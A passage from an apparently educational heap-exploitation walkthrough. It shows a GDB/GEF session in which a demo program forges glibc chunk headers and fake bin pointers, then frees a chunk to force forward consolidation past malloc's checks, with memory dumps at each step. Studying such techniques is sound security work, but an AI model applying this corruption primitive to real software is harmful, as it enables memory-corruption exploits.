0x00007fffffffdf98│+0x0018: 0x0000000000000064 ("d"?)
0x00007fffffffdfa0│+0x0020: 0x0000000000001000
0x00007fffffffdfa8│+0x0028: 0x00005555555550c0  →  <_start+0> endbr64
0x00007fffffffdfb0│+0x0030: 0x0000000000000001   ← $rbp
0x00007fffffffdfb8│+0x0038: 0x00007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555228 <main+127>    call   0x555555555090 <puts@plt>
   0x55555555522d <main+132>    mov edi, 0x420
   0x555555555232 <main+137>    call   0x5555555550b0 <malloc@plt>
 → 0x555555555237 <main+142>    mov QWORD PTR [rbp-0x28], rax
   0x55555555523b <main+146>    mov edi, 0x420
   0x555555555240 <main+151>    call   0x5555555550b0 <malloc@plt>
   0x555555555245 <main+156>    mov QWORD PTR [rbp-0x20], rax
   0x555555555249 <main+160>    mov edi, 0x80
   0x55555555524e <main+165>    call   0x5555555550b0 <malloc@plt>
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fwd_consolidati", stopped 0x555555555237 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555237 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$1 = 0x55555555a6b0
gef➤  c
Continuing.

Breakpoint 5, 0x0000555555555253 in main ()


[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x000055555555af10  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x91            
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf80  →  0x0000000000000002
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x000055555555af90  →  0x0000000000000000
$rdi   : 0x0             
$rip   : 0x0000555555555253  →  <main+170> mov QWORD PTR [rbp-0x18], rax
$r8 : 0x0            
$r9 : 0x000055555555af10  →  0x0000000000000000
$r10   : 0x77            
$r11   : 0x00007ffff7e19ce0  →  0x000055555555af90  →  0x0000000000000000
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3cb  →  "/Hackery/shogun/pwn_demos/malloc/fwd_cons[...]"
$r13   : 0x00005555555551a9  →  <main+0> endbr64
$r14   : 0x0000555555558da8  →  0x0000555555555160  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf80│+0x0000: 0x0000000000000002   ← $rsp
0x00007fffffffdf88│+0x0008: 0x000055555555a6b0  →  0x0000000000000000
0x00007fffffffdf90│+0x0010: 0x000055555555aae0  →  0x0000000000000000
0x00007fffffffdf98│+0x0018: 0x0000000000000064 ("d"?)
0x00007fffffffdfa0│+0x0020: 0x0000000000001000
0x00007fffffffdfa8│+0x0028: 0x00005555555550c0  →  <_start+0> endbr64
0x00007fffffffdfb0│+0x0030: 0x0000000000000001   ← $rbp
0x00007fffffffdfb8│+0x0038: 0x00007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555245 <main+156>    mov QWORD PTR [rbp-0x20], rax
   0x555555555249 <main+160>    mov edi, 0x80
   0x55555555524e <main+165>    call   0x5555555550b0 <malloc@plt>
 → 0x555555555253 <main+170>    mov QWORD PTR [rbp-0x18], rax
   0x555555555257 <main+174>    mov rax, QWORD PTR [rbp-0x28]
   0x55555555525b <main+178>    mov rsi, rax
   0x55555555525e <main+181>    lea rax, [rip+0x10fa]       # 0x55555555635f
   0x555555555265 <main+188>    mov rdi, rax
   0x555555555268 <main+191>    mov eax, 0x0
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fwd_consolidati", stopped 0x555555555253 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555253 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/300g 0x55555555a6b0-0x10
0x55555555a6a0: 0x0 0x431
0x55555555a6b0: 0x0 0x0
0x55555555a6c0: 0x0 0x0
0x55555555a6d0: 0x0 0x0
0x55555555a6e0: 0x0 0x0
0x55555555a6f0: 0x0 0x0
0x55555555a700: 0x0 0x0
0x55555555a710: 0x0 0x0
0x55555555a720: 0x0 0x0
0x55555555a730: 0x0 0x0
0x55555555a740: 0x0 0x0
0x55555555a750: 0x0 0x0
0x55555555a760: 0x0 0x0
0x55555555a770: 0x0 0x0
0x55555555a780: 0x0 0x0
0x55555555a790: 0x0 0x0
0x55555555a7a0: 0x0 0x0
0x55555555a7b0: 0x0 0x0
0x55555555a7c0: 0x0 0x0
0x55555555a7d0: 0x0 0x0
0x55555555a7e0: 0x0 0x0
0x55555555a7f0: 0x0 0x0
0x55555555a800: 0x0 0x0
0x55555555a810: 0x0 0x0
0x55555555a820: 0x0 0x0
0x55555555a830: 0x0 0x0
0x55555555a840: 0x0 0x0
0x55555555a850: 0x0 0x0
0x55555555a860: 0x0 0x0
0x55555555a870: 0x0 0x0
0x55555555a880: 0x0 0x0
0x55555555a890: 0x0 0x0
0x55555555a8a0: 0x0 0x0
0x55555555a8b0: 0x0 0x0
0x55555555a8c0: 0x0 0x0
0x55555555a8d0: 0x0 0x0
0x55555555a8e0: 0x0 0x0
0x55555555a8f0: 0x0 0x0
0x55555555a900: 0x0 0x0
0x55555555a910: 0x0 0x0
0x55555555a920: 0x0 0x0
0x55555555a930: 0x0 0x0
0x55555555a940: 0x0 0x0
0x55555555a950: 0x0 0x0
0x55555555a960: 0x0 0x0
0x55555555a970: 0x0 0x0
0x55555555a980: 0x0 0x0
0x55555555a990: 0x0 0x0
0x55555555a9a0: 0x0 0x0
0x55555555a9b0: 0x0 0x0
0x55555555a9c0: 0x0 0x0
0x55555555a9d0: 0x0 0x0
0x55555555a9e0: 0x0 0x0
0x55555555a9f0: 0x0 0x0
0x55555555aa00: 0x0 0x0
0x55555555aa10: 0x0 0x0
0x55555555aa20: 0x0 0x0
0x55555555aa30: 0x0 0x0
0x55555555aa40: 0x0 0x0
0x55555555aa50: 0x0 0x0
0x55555555aa60: 0x0 0x0
0x55555555aa70: 0x0 0x0
0x55555555aa80: 0x0 0x0
0x55555555aa90: 0x0 0x0
0x55555555aaa0: 0x0 0x0
0x55555555aab0: 0x0 0x0
0x55555555aac0: 0x0 0x0
0x55555555aad0: 0x0 0x431
0x55555555aae0: 0x0 0x0
0x55555555aaf0: 0x0 0x0
0x55555555ab00: 0x0 0x0
0x55555555ab10: 0x0 0x0
0x55555555ab20: 0x0 0x0
0x55555555ab30: 0x0 0x0
0x55555555ab40: 0x0 0x0
0x55555555ab50: 0x0 0x0
0x55555555ab60: 0x0 0x0
0x55555555ab70: 0x0 0x0
0x55555555ab80: 0x0 0x0
0x55555555ab90: 0x0 0x0
0x55555555aba0: 0x0 0x0
0x55555555abb0: 0x0 0x0
0x55555555abc0: 0x0 0x0
0x55555555abd0: 0x0 0x0
0x55555555abe0: 0x0 0x0
0x55555555abf0: 0x0 0x0
0x55555555ac00: 0x0 0x0
0x55555555ac10: 0x0 0x0
0x55555555ac20: 0x0 0x0
0x55555555ac30: 0x0 0x0
0x55555555ac40: 0x0 0x0
0x55555555ac50: 0x0 0x0
0x55555555ac60: 0x0 0x0
0x55555555ac70: 0x0 0x0
0x55555555ac80: 0x0 0x0
0x55555555ac90: 0x0 0x0
0x55555555aca0: 0x0 0x0
0x55555555acb0: 0x0 0x0
0x55555555acc0: 0x0 0x0
0x55555555acd0: 0x0 0x0
0x55555555ace0: 0x0 0x0
0x55555555acf0: 0x0 0x0
0x55555555ad00: 0x0 0x0
0x55555555ad10: 0x0 0x0
0x55555555ad20: 0x0 0x0
0x55555555ad30: 0x0 0x0
0x55555555ad40: 0x0 0x0
0x55555555ad50: 0x0 0x0
0x55555555ad60: 0x0 0x0
0x55555555ad70: 0x0 0x0
0x55555555ad80: 0x0 0x0
0x55555555ad90: 0x0 0x0
0x55555555ada0: 0x0 0x0
0x55555555adb0: 0x0 0x0
0x55555555adc0: 0x0 0x0
0x55555555add0: 0x0 0x0
0x55555555ade0: 0x0 0x0
0x55555555adf0: 0x0 0x0
0x55555555ae00: 0x0 0x0
0x55555555ae10: 0x0 0x0
0x55555555ae20: 0x0 0x0
0x55555555ae30: 0x0 0x0
0x55555555ae40: 0x0 0x0
0x55555555ae50: 0x0 0x0
0x55555555ae60: 0x0 0x0
0x55555555ae70: 0x0 0x0
0x55555555ae80: 0x0 0x0
0x55555555ae90: 0x0 0x0
0x55555555aea0: 0x0 0x0
0x55555555aeb0: 0x0 0x0
0x55555555aec0: 0x0 0x0
0x55555555aed0: 0x0 0x0
0x55555555aee0: 0x0 0x0
0x55555555aef0: 0x0 0x0
0x55555555af00: 0x0 0x91
0x55555555af10: 0x0 0x0
0x55555555af20: 0x0 0x0
0x55555555af30: 0x0 0x0
0x55555555af40: 0x0 0x0
0x55555555af50: 0x0 0x0
0x55555555af60: 0x0 0x0
0x55555555af70: 0x0 0x0
0x55555555af80: 0x0 0x0
0x55555555af90: 0x0 0x20071
0x55555555afa0: 0x0 0x0
0x55555555afb0: 0x0 0x0
0x55555555afc0: 0x0 0x0
0x55555555afd0: 0x0 0x0
0x55555555afe0: 0x0 0x0
0x55555555aff0: 0x0 0x0
```

So, we see our three heap chunks, and the top chunk at `0x55555555af90`.

Now let's see them, after we create our fake chunk headers, and preparation for forward consolidation:

```
gef➤  c
Continuing.
Chunk0: 0x55555555a6b0
Chunk1: 0x55555555aae0
Chunk2: 0x55555555af10

We will be trying to forward consolidate Chunk1 (0x55555555aae0) into chunk2 (0x55555555af10).

So in order to do this, we will need to create several fake heap chunk headers.
We will have to do more work than in previous libc versions, because of additional checks.

First off, we will need to overwrite the size of Chunk1, so that it extends into Chunk2.
I want the new consolidated chunk to extend 0x60 bytes into chunk2 (from 0x430 to 0x490).
The first 0x40 bytes will come from expanding the chunk size of chunk1.
The remaining 0x20 bytes will come from the fake chunk header we are consolidating into.
So I will increase its size from 0x431 to 0x471 (prev_inuse flag set).

Chunk1 old size:    0x431
Chunk1 new size:    0x471

Now after that, we will have to prepare the fake heap chunk header, for the fake heap chunk we will try to consolidate into.
For this, there are 4 separate values we will need to set.
The first two are the prev_size / chunk header size for the fake chunk.

The prev_size will need to match the expanded size for chunk1, so it will be:   0x470
The chunk header size will be 0x20, so we will expand the remaining 0x20 bytes.

The remaining two values, will be the fwd/next ptrs for a libc main arena bin.
As part of consolidation, it will expect the chunk we are consolidating into to be in a main arena bin.
As such it will attempt to unlink the chunk from the bin, so we need to prepare for this.
We will create a fake chunk in chunk0 (0x55555555a6b0) with fwd/bk ptrs to our fake chunk (0x55555555af40).
And set our fwd/bk ptrs for our fake chunk to chunk0 (0x55555555a6b0)

Now, we will create the fake libc main arena bin head chunk in chunk0.
We will set the fwd/next ptrs to our fake chunk.

There is one last fake header chunk we will need to create.
We will need to create a fake chunk header, after the chunk we are consolidating into.
This is for several reasons.
First off, as part of forward consolidation, it will check (and update) the prev_size of the chunk after the chunk we are consolidating into.
Secondly, as part of the malloc call where we will get the newly consolidated chunk, it will check the chunk size of the chunk after the consolidated fake chunk.
So, we will need to set a prev_size, and chunk_size, that makes sense with the fake chunk that we created to consolidate into.
For the prev_size, I choose 0x20, to match the size of our fake chunk to consolidate into.
For the chunk size, I choose 0x30, to line up with the top chunk. While we don't strictly need to do this here, we can still fail certain checks if this chunk doesn't line up with another chunk.

Now we will go ahead, and free chunk1, to cause fwd consolidation.


Breakpoint 2, 0x0000555555555592 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x000055555555aae0  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x00007ffff7d14a77  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x1             
$rsp   : 0x00007fffffffdf80  →  0x0000000000000002
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x1             
$rdi   : 0x000055555555aae0  →  0x0000000000000000
$rip   : 0x0000555555555592  →  <main+1001> call 0x555555555080 <free@plt>
$r8 : 0x0            
$r9 : 0x00007fffffffde56  →  0x3a06aad624003033 ("30"?)
$r10   : 0x0             
$r11   : 0x246           
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3cb  →  "/Hackery/shogun/pwn_demos/malloc/fwd_cons[...]"
$r13   : 0x00005555555551a9  →  <main+0> endbr64
$r14   : 0x0000555555558da8  →  0x0000555555555160  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf80│+0x0000: 0x0000000000000002   ← $rsp
0x00007fffffffdf88│+0x0008: 0x000055555555a6b0  →  0x0000000000000000
0x00007fffffffdf90│+0x0010: 0x000055555555aae0  →  0x0000000000000000
0x00007fffffffdf98│+0x0018: 0x000055555555af10  →  0x0000000000000000
0x00007fffffffdfa0│+0x0020: 0x0000000000001000
0x00007fffffffdfa8│+0x0028: 0x00005555555550c0  →  <_start+0> endbr64
0x00007fffffffdfb0│+0x0030: 0x0000000000000001   ← $rbp
0x00007fffffffdfb8│+0x0038: 0x00007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555586 <main+989>    call   0x555555555090 <puts@plt>
   0x55555555558b <main+994>    mov rax, QWORD PTR [rbp-0x20]
   0x55555555558f <main+998>    mov rdi, rax
 → 0x555555555592 <main+1001>   call   0x555555555080 <free@plt>
   ↳  0x555555555080 <free@plt+0>   endbr64
    0x555555555084 <free@plt+4>     bnd jmp QWORD PTR [rip+0x3f2d]      # 0x555555558fb8 <free@got.plt>
    0x55555555508b <free@plt+11>    nop DWORD PTR [rax+rax*1+0x0]
    0x555555555090 <puts@plt+0>     endbr64
    0x555555555094 <puts@plt+4>     bnd jmp QWORD PTR [rip+0x3f25]      # 0x555555558fc0 <puts@got.plt>
    0x55555555509b <puts@plt+11>    nop DWORD PTR [rax+rax*1+0x0]
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
free@plt (
   $rdi = 0x000055555555aae0 → 0x0000000000000000,
   $rsi = 0x0000000000000001
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fwd_consolidati", stopped 0x555555555592 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555592 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/300g 0x55555555a6a0
0x55555555a6a0: 0x0 0x431
0x55555555a6b0: 0x0 0x0
0x55555555a6c0: 0x55555555af40  0x55555555af40
0x55555555a6d0: 0x0 0x0
0x55555555a6e0: 0x0 0x0
0x55555555a6f0: 0x0 0x0
0x55555555a700: 0x0 0x0
0x55555555a710: 0x0 0x0
0x55555555a720: 0x0 0x0
0x55555555a730: 0x0 0x0
0x55555555a740: 0x0 0x0
0x55555555a750: 0x0 0x0
0x55555555a760: 0x0 0x0
0x55555555a770: 0x0 0x0
0x55555555a780: 0x0 0x0
0x55555555a790: 0x0 0x0
0x55555555a7a0: 0x0 0x0
0x55555555a7b0: 0x0 0x0
0x55555555a7c0: 0x0 0x0
0x55555555a7d0: 0x0 0x0
0x55555555a7e0: 0x0 0x0
0x55555555a7f0: 0x0 0x0
0x55555555a800: 0x0 0x0
0x55555555a810: 0x0 0x0
0x55555555a820: 0x0 0x0
0x55555555a830: 0x0 0x0
0x55555555a840: 0x0 0x0
0x55555555a850: 0x0 0x0
0x55555555a860: 0x0 0x0
0x55555555a870: 0x0 0x0
0x55555555a880: 0x0 0x0
0x55555555a890: 0x0 0x0
0x55555555a8a0: 0x0 0x0
0x55555555a8b0: 0x0 0x0
0x55555555a8c0: 0x0 0x0
0x55555555a8d0: 0x0 0x0
0x55555555a8e0: 0x0 0x0
0x55555555a8f0: 0x0 0x0
0x55555555a900: 0x0 0x0
0x55555555a910: 0x0 0x0
0x55555555a920: 0x0 0x0
0x55555555a930: 0x0 0x0
0x55555555a940: 0x0 0x0
0x55555555a950: 0x0 0x0
0x55555555a960: 0x0 0x0
0x55555555a970: 0x0 0x0
0x55555555a980: 0x0 0x0
0x55555555a990: 0x0 0x0
0x55555555a9a0: 0x0 0x0
0x55555555a9b0: 0x0 0x0
0x55555555a9c0: 0x0 0x0
0x55555555a9d0: 0x0 0x0
0x55555555a9e0: 0x0 0x0
0x55555555a9f0: 0x0 0x0
0x55555555aa00: 0x0 0x0
0x55555555aa10: 0x0 0x0
0x55555555aa20: 0x0 0x0
0x55555555aa30: 0x0 0x0
0x55555555aa40: 0x0 0x0
0x55555555aa50: 0x0 0x0
0x55555555aa60: 0x0 0x0
0x55555555aa70: 0x0 0x0
0x55555555aa80: 0x0 0x0
0x55555555aa90: 0x0 0x0
0x55555555aaa0: 0x0 0x0
0x55555555aab0: 0x0 0x0
0x55555555aac0: 0x0 0x0
0x55555555aad0: 0x0 0x471
0x55555555aae0: 0x0 0x0
0x55555555aaf0: 0x0 0x0
0x55555555ab00: 0x0 0x0
0x55555555ab10: 0x0 0x0
0x55555555ab20: 0x0 0x0
0x55555555ab30: 0x0 0x0
0x55555555ab40: 0x0 0x0
0x55555555ab50: 0x0 0x0
0x55555555ab60: 0x0 0x0
0x55555555ab70: 0x0 0x0
0x55555555ab80: 0x0 0x0
0x55555555ab90: 0x0 0x0
0x55555555aba0: 0x0 0x0
0x55555555abb0: 0x0 0x0
0x55555555abc0: 0x0 0x0
0x55555555abd0: 0x0 0x0
0x55555555abe0: 0x0 0x0
0x55555555abf0: 0x0 0x0
0x55555555ac00: 0x0 0x0
0x55555555ac10: 0x0 0x0
0x55555555ac20: 0x0 0x0
0x55555555ac30: 0x0 0x0
0x55555555ac40: 0x0 0x0
0x55555555ac50: 0x0 0x0
0x55555555ac60: 0x0 0x0
0x55555555ac70: 0x0 0x0
0x55555555ac80: 0x0 0x0
0x55555555ac90: 0x0 0x0
0x55555555aca0: 0x0 0x0
0x55555555acb0: 0x0 0x0
0x55555555acc0: 0x0 0x0
0x55555555acd0: 0x0 0x0
0x55555555ace0: 0x0 0x0
0x55555555acf0: 0x0 0x0
0x55555555ad00: 0x0 0x0
0x55555555ad10: 0x0 0x0
0x55555555ad20: 0x0 0x0
0x55555555ad30: 0x0 0x0
0x55555555ad40: 0x0 0x0
0x55555555ad50: 0x0 0x0
0x55555555ad60: 0x0 0x0
0x55555555ad70: 0x0 0x0
0x55555555ad80: 0x0 0x0
0x55555555ad90: 0x0 0x0
0x55555555ada0: 0x0 0x0
0x55555555adb0: 0x0 0x0
0x55555555adc0: 0x0 0x0
0x55555555add0: 0x0 0x0
0x55555555ade0: 0x0 0x0
0x55555555adf0: 0x0 0x0
0x55555555ae00: 0x0 0x0
0x55555555ae10: 0x0 0x0
0x55555555ae20: 0x0 0x0
0x55555555ae30: 0x0 0x0
0x55555555ae40: 0x0 0x0
0x55555555ae50: 0x0 0x0
0x55555555ae60: 0x0 0x0
0x55555555ae70: 0x0 0x0
0x55555555ae80: 0x0 0x0
0x55555555ae90: 0x0 0x0
0x55555555aea0: 0x0 0x0
0x55555555aeb0: 0x0 0x0
0x55555555aec0: 0x0 0x0
0x55555555aed0: 0x0 0x0
0x55555555aee0: 0x0 0x0
0x55555555aef0: 0x0 0x0
0x55555555af00: 0x0 0x91
0x55555555af10: 0x0 0x0
0x55555555af20: 0x0 0x0
0x55555555af30: 0x0 0x0
0x55555555af40: 0x470   0x21
0x55555555af50: 0x55555555a6b0  0x55555555a6b0
0x55555555af60: 0x20    0x30
0x55555555af70: 0x0 0x0
0x55555555af80: 0x0 0x0
0x55555555af90: 0x0 0x20071
0x55555555afa0: 0x0 0x0
0x55555555afb0: 0x0 0x0
0x55555555afc0: 0x0 0x0
0x55555555afd0: 0x0 0x0
0x55555555afe0: 0x0 0x0
0x55555555aff0: 0x0 0x0
```

So first off, we see the prepared main arena bin chunk for the unlinking at `0x55555555a6b0`, with a fwd/bk ptr of `0x55555555af40`. Also one thing to note, under certain libc versions and in certain conditions, that very unlinking functionality is quite helpful in heap pwning.

After that, we see that we updated the size value of `chunk1` at `0x55555555aad8` to be `0x471`. We also see the two separate heap chunk headers we made at `0x55555555af40` and `0x55555555af60`. Now let's go ahead and free `chunk1`, to see what it looks like after forward consolidation happens!

```
gef➤  c
Continuing.

Breakpoint 3, 0x0000555555555597 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0             
$rbx   : 0x0             
$rcx   : 0x21            
$rdx   : 0x00007ffff7e19ce0  →  0x000055555555af90  →  0x0000000000000000
$rsp   : 0x00007fffffffdf80  →  0x0000000000000002
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x000055555555a6b0  →  0x0000000000000000
$rdi   : 0x000055555555af40  →  0x0000000000000470
$rip   : 0x0000555555555597  →  <main+1006> mov esi, 0x480
$r8 : 0x0            
$r9 : 0x00007fffffffde56  →  0x3a06aad624003033 ("30"?)
$r10   : 0x0             
$r11   : 0x246           
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3cb  →  "/Hackery/shogun/pwn_demos/malloc/fwd_cons[...]"
$r13   : 0x00005555555551a9  →  <main+0> endbr64
$r14   : 0x0000555555558da8  →  0x0000555555555160  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf80│+0x0000: 0x0000000000000002   ← $rsp
0x00007fffffffdf88│+0x0008: 0x000055555555a6b0  →  0x0000000000000000
0x00007fffffffdf90│+0x0010: 0x000055555555aae0  →  0x00007ffff7e19ce0  →  0x000055555555af90  →  0x0000000000000000
0x00007fffffffdf98│+0x0018: 0x000055555555af10  →  0x0000000000000000
0x00007fffffffdfa0│+0x0020: 0x0000000000001000
0x00007fffffffdfa8│+0x0028: 0x00005555555550c0  →  <_start+0> endbr64
0x00007fffffffdfb0│+0x0030: 0x0000000000000001   ← $rbp
0x00007fffffffdfb8│+0x0038: 0x00007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55555555558b <main+994>    mov rax, QWORD PTR [rbp-0x20]
   0x55555555558f <main+998>    mov rdi, rax
   0x555555555592 <main+1001>   call   0x555555555080 <free@plt>
 → 0x555555555597 <main+1006>   mov esi, 0x480
   0x55555555559c <main+1011>   lea rax, [rip+0x1895]       # 0x555555556e38
   0x5555555555a3 <main+1018>   mov rdi, rax
   0x5555555555a6 <main+1021>   mov eax, 0x0
   0x5555555555ab <main+1026>   call   0x5555555550a0 <printf@plt>
   0x5555555555b0 <main+1031>   mov edi, 0x480
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fwd_consolidati", stopped 0x555555555597 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555597 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/300g 0x55555555a6a0
0x55555555a6a0: 0x0 0x431
0x55555555a6b0: 0x0 0x0
0x55555555a6c0: 0x55555555a6b0  0x55555555a6b0
0x55555555a6d0: 0x0 0x0
0x55555555a6e0: 0x0 0x0
0x55555555a6f0: 0x0 0x0
0x55555555a700: 0x0 0x0
0x55555555a710: 0x0 0x0
0x55555555a720: 0x0 0x0
0x55555555a730: 0x0 0x0
0x55555555a740: 0x0 0x0
0x55555555a750: 0x0 0x0
0x55555555a760: 0x0 0x0
0x55555555a770: 0x0 0x0
0x55555555a780: 0x0 0x0
0x55555555a790: 0x0 0x0
0x55555555a7a0: 0x0 0x0
0x55555555a7b0: 0x0 0x0
0x55555555a7c0: 0x0 0x0
0x55555555a7d0: 0x0 0x0
0x55555555a7e0: 0x0 0x0
0x55555555a7f0: 0x0 0x0
0x55555555a800: 0x0 0x0
0x55555555a810: 0x0 0x0
0x55555555a820: 0x0 0x0
0x55555555a830: 0x0 0x0
0x55555555a840: 0x0 0x0
0x55555555a850: 0x0 0x0
0x55555555a860: 0x0 0x0
0x55555555a870: 0x0 0x0
0x55555555a880: 0x0 0x0
0x55555555a890: 0x0 0x0
0x55555555a8a0: 0x0 0x0
0x55555555a8b0: 0x0 0x0
0x55555555a8c0: 0x0 0x0
0x55555555a8d0: 0x0 0x0
0x55555555a8e0: 0x0 0x0
0x55555555a8f0: 0x0 0x0
0x55555555a900: 0x0 0x0
0x55555555a910: 0x0 0x0
0x55555555a920: 0x0 0x0
0x55555555a930: 0x0 0x0
0x55555555a940: 0x0 0x0
0x55555555a950: 0x0 0x0
0x55555555a960: 0x0 0x0
0x55555555a970: 0x0 0x0
0x55555555a980: 0x0 0x0
0x55555555a990: 0x0 0x0
0x55555555a9a0: 0x0 0x0
0x55555555a9b0: 0x0 0x0
0x55555555a9c0: 0x0 0x0
0x55555555a9d0: 0x0 0x0
0x55555555a9e0: 0x0 0x0
0x55555555a9f0: 0x0 0x0
0x55555555aa00: 0x0 0x0
0x55555555aa10: 0x0 0x0
0x55555555aa20: 0x0 0x0
0x55555555aa30: 0x0 0x0
0x55555555aa40: 0x0 0x0
0x55555555aa50: 0x0 0x0
0x55555555aa60: 0x0 0x0
0x55555555aa70: 0x0 0x0
0x55555555aa80: 0x0 0x0
0x55555555aa90: 0x0 0x0
0x55555555aaa0: 0x0 0x0
0x55555555aab0: 0x0 0x0
0x55555555aac0: 0x0 0x0
0x55555555aad0: 0x0 0x491
0x55555555aae0: 0x7ffff7e19ce0  0x7ffff7e19ce0
0x55555555aaf0: 0x0 0x0
0x55555555ab00: 0x0 0x0
0x55555555ab10: 0x0 0x0
0x55555555ab20: 0x0 0x0
0x55555555ab30: 0x0 0x0
0x55555555ab40: 0x0 0x0
0x55555555ab50: 0x0 0x0
0x55555555ab60: 0x0 0x0
0x55555555ab70: 0x0 0x0
0x55555555ab80: 0x0 0x0
0x55555555ab90: 0x0 0x0
0x55555555aba0: 0x0 0x0
0x55555555abb0: 0x0 0x0
0x55555555abc0: 0x0 0x0
0x55555555abd0: 0x0 0x0
0x55555555abe0: 0x0 0x0
0x55555555abf0: 0x0 0x0
0x55555555ac00: 0x0 0x0
0x55555555ac10: 0x0 0x0
0x55555555ac20: 0x0 0x0
0x55555555ac30: 0x0 0x0
0x55555555ac40: 0x0 0x0
0x55555555ac50: 0x0 0x0
0x55555555ac60: 0x0 0x0
0x55555555ac70: 0x0 0x0
0x55555555ac80: 0x0 0x0
0x55555555ac90: 0x0 0x0
0x55555555aca0: 0x0 0x0
0x55555555acb0: 0x0 0x0
0x55555555acc0: 0x0 0x0
0x55555555acd0: 0x0 0x0
0x55555555ace0: 0x0 0x0
0x55555555acf0: 0x0 0x0
0x55555555ad00: 0x0 0x0
0x55555555ad10: 0x0 0x0
0x55555555ad20: 0x0 0x0
0x55555555ad30: 0x0 0x0
0x55555555ad40: 0x0 0x0
0x55555555ad50: 0x0 0x0
0x55555555ad60: 0x0 0x0
0x55555555ad70: 0x0 0x0
0x55555555ad80: 0x0 0x0
0x55555555ad90: 0x0 0x0
0x55555555ada0: 0x0 0x0
0x55555555adb0: 0x0 0x0
0x55555555adc0: 0x0 0x0
0x55555555add0: 0x0 0x0
0x55555555ade0: 0x0 0x0
0x55555555adf0: 0x0 0x0
0x55555555ae00: 0x0 0x0
0x55555555ae10: 0x0 0x0
0x55555555ae20: 0x0 0x0
0x55555555ae30: 0x0 0x0
0x55555555ae40: 0x0 0x0
0x55555555ae50: 0x0 0x0
0x55555555ae60: 0x0 0x0
0x55555555ae70: 0x0 0x0
0x55555555ae80: 0x0 0x0
0x55555555ae90: 0x0 0x0
0x55555555aea0: 0x0 0x0
0x55555555aeb0: 0x0 0x0
0x55555555aec0: 0x0 0x0
0x55555555aed0: 0x0 0x0
0x55555555aee0: 0x0 0x0
0x55555555aef0: 0x0 0x0
0x55555555af00: 0x0 0x91
0x55555555af10: 0x0 0x0
0x55555555af20: 0x0 0x0
0x55555555af30: 0x0 0x0
0x55555555af40: 0x470   0x21
0x55555555af50: 0x55555555a6b0  0x55555555a6b0
0x55555555af60: 0x490   0x30
0x55555555af70: 0x0 0x0
0x55555555af80: 0x0 0x0
0x55555555af90: 0x0 0x20071
0x55555555afa0: 0x0 0x0
0x55555555afb0: 0x0 0x0
0x55555555afc0: 0x0 0x0
0x55555555afd0: 0x0 0x0
0x55555555afe0: 0x0 0x0
0x55555555aff0: 0x0 0x0
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e19c80 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
